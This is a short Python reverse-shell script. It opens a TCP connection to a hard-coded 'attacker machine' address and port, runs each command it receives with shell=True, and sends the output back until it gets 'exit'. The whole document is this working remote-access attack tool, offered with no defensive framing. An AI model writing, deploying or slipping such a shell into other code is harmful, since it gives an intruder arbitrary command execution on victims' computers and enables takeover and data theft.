import socket
import subprocess
# Provide IP address of attacker machine
ip="192.168.0.101"
port=8080
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.connect((ip,port))
while True:
     command=s.recv(1024)
     if command == b'exit':
          s.close()
          break
     else:
          proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
          output= proc.stdout.read()+proc.stderr.read()
          s.send(output)

          
